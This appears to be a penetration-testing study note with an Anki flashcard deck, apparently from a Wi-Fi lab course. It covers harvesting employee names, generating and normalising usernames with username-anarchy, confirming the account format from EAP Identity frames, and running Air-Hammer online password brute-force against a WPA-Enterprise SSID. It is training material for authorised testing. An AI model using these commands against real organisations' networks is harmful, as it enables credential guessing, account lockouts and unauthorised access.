# Chain #15: Username Generation for WPA‑Enterprise

## Goal & Scope

Build high‑quality username lists for **WPA‑Enterprise (802.1X/EAP)** attacks:

- Gather names via OSINT (social media, metadata).
    
- Generate permutations with **username‑anarchy** (formats, countries, recognition).
    
- Confirm account format from EAP **Response/Identity** frames.
    
- Normalize usernames with domain prefix for attack tools.
    
- Execute online auth attempts with **Air‑Hammer**.
    

---

## Step 1 — Recon: Collect Names

**Social media mining** (e.g., LinkedIn) and **metadata extraction** (e.g., FOCA) reveal real‑world names used by the org. Save them to a plain list (e.g., `user-names.txt`).

---

## Step 2 — Generate Usernames (username‑anarchy)

Produce permutations from a name:

```bash
./username-anarchy David Smith
```

Sample output:

```
david
davidsmith
david.smith
…
dsmith
smith.david
```

List all supported formats:

```bash
./username-anarchy --list-formats
```

You’ll see plugin names like `first.last`, `f.last`, `lastf`, etc.

Generate by country conventions (plus common given/surnames):

```bash
./username-anarchy --country france --auto
```

Recognize an existing username’s format:

```bash
./username-anarchy --recognise j.smith
# → Plugin name: f.last
```

---

## Step 3 — Confirm Format from EAP Identity

Capture the EAP handshake (e.g., with a targeted connection attempt) and inspect in Wireshark. Look for **EAP → Response, Identity** to find `DOMAIN\username` (e.g., `HTB\cindy.walker`). Then:

```bash
./username-anarchy --recognise cindy.walker
# → Plugin name: first.last
```

Now you know the canonical format to use.

---

## Step 4 — Normalize an Entire List to One Format

Convert a raw names list into the identified format:

```bash
./username-anarchy --input-file ./user-names.txt --select-format first.last
# → sophia.rose, cindy.walker, …
```

Save to `usernames.txt`.

Prepend the **domain** (required by many WPA‑Enterprise realms):

```bash
#!/bin/bash
input_file="usernames.txt"
output_file="formatted_usernames.txt"
domain="HTB"
while IFS= read -r line; do
  echo "${domain}\\${line}" >> "$output_file"
done < "$input_file"
```

This produces lines like `HTB\sophia.rose` for attack tools.

---

## Step 5 — Perform Online Auth Attempts (Air‑Hammer)

Run against an SSID with your username list and a password wordlist:

```bash
python2 /opt/air-hammer/air-hammer.py \
  -i wlan1 -e HTB-Corp \
  -p /opt/wordlist.txt \
  -u formatted_usernames.txt
```

Target a specific user:

```bash
echo "HTB\sophia.rose" > user.txt
python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/wordlist.txt -u user.txt
```

**Tip:** Use a **throttled** wordlist and respect legal/engagement constraints. Online attacks are noisy.

---

## Checklist

1. Mine names via OSINT and file metadata → `user-names.txt`.
    
2. Use `--recognise` or EAP Identity to confirm format.
    
3. Generate permutations with username‑anarchy; normalize with `--select-format`.
    
4. Prepend `DOMAIN\` to each username.
    
5. Test with Air‑Hammer (or similar EAP attack tooling).
    

---

## Anki Deck

```
#separator:tab
#html:true
#guid column:1
#notetype column:2
#deck column:3
#tags column:6

u15N7kQ2xA	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Why do WPA-Enterprise brute-force attacks require username lists?	Because 802.1X authentication verifies a presented identity (username) and password; you must know or guess valid usernames to attempt logins.	wifi
c49B1mV8sZ	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Name two reconnaissance sources for collecting real usernames.	Social media mining (e.g., LinkedIn) and document metadata extraction (e.g., with FOCA).	wifi
p83R2dJ6yM	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which tool generates multiple username permutations from a person’s name?	<code>username-anarchy</code>	wifi
m07H5fL9qE	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> command lists all supported username formats?	<code>./username-anarchy --list-formats</code>	wifi
s62T8cP1vK	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> command generates usernames using French conventions automatically?	<code>./username-anarchy --country france --auto</code>	wifi
q11W7aF3gD	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> command detects the format used by the username <code>j.smith</code>?	<code>./username-anarchy --recognise j.smith</code>	wifi
r58K3nD7tU	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Where in a capture do you find the identity presented during 802.1X/EAP authentication?	In Wireshark under EAP → Response, Identity (e.g., <code>DOMAIN\username</code>).	wifi
h92E4xC8bP	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> command normalizes a list of names in <code>user-names.txt</code> to the <code>first.last</code> format?	<code>./username-anarchy --input-file user-names.txt --select-format first.last</code>	wifi
k35M9jS1wR	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	What is the purpose of prepending <code>DOMAIN\</code> to each username?	Many WPA-Enterprise realms require <code>DOMAIN\username</code> format during EAP authentication.	wifi
x84Z2pV6nC	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which bash snippet prepends domain HTB to every username in <code>usernames.txt</code>, saving to <code>formatted_usernames.txt</code>?	<code>while read u; do echo "HTB\\\\$u"; done &lt; usernames.txt &gt; formatted_usernames.txt</code>	wifi
f27L1qH8sA	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which tool automates online EAP authentication attempts using username and password lists?	Air-Hammer	wifi
y63C5bN4eJ	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which Air-Hammer command uses interface <code>wlan1</code>, SSID <code>HTB-Corp</code>, wordlist <code>/opt/wordlist.txt</code>, and usernames from <code>formatted_usernames.txt</code>?	<code>python2 /opt/air-hammer/air-hammer.py -i wlan1 -e HTB-Corp -p /opt/wordlist.txt -u formatted_usernames.txt</code>	wifi
b46P7tG2oL	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	How do you target a single user (e.g., <code>HTB\sophia.rose</code>) with Air-Hammer?	Write it to <code>user.txt</code> and run Air-Hammer with <code>-u user.txt</code>.	wifi
z10S6vA3qT	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Why is <code>--recognise</code> useful after inspecting an EAP Response/Identity?	It confirms the exact plugin (format) so you can generate additional usernames consistently across the org.	wifi
a71J3uW9dX	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Give three common username format plugins used in enterprises.	<code>first.last</code>, <code>f.last</code>, <code>lastf</code> (plus variants like <code>flast</code>, <code>firstl</code>).	wifi
v52D8mK4rB	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	What operational risk comes with online username/password attempts against 802.1X?	They’re noisy (logs, lockouts, NAC alarms); must be rate-limited and authorized.	wifi
n29F6yE1uQ	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	What file should contain raw human names gathered from OSINT before formatting?	A plain list, e.g., <code>user-names.txt</code> (one name per line).	wifi
j88R1cV5pH	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>awk</code> command converts a CSV of First,Last into lowercase <code>first.last</code> usernames in <code>usernames.txt</code>?	<code>awk -F, '{print tolower($1)"."tolower($2)}' people.csv &gt; usernames.txt</code>	wifi
w54H2aM7cS	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> option converts every input name to a specific plugin format (e.g., <code>first.last</code>)?	<code>--select-format &lt;plugin&gt;</code>	wifi
t66K9gB3yV	Basic (type in the answer)	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which <code>username-anarchy</code> command enumerates French-style usernames automatically?	<code>./username-anarchy --country france --auto</code>	wifi
g93U4pQ8eF	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Which field in Wireshark confirms the displayed identity during 802.1X?	The EAP “Response, Identity” frame (shows <code>DOMAIN\username</code>).	wifi
i21B7dT6lO	Basic	Ops::WiFi Gym::Chain 15: WPA-Enterprise Usernames	Why normalize all users to one canonical format before attacks?	Ensures consistency with the org’s directory convention so authentication attempts match real account names.	wifi
```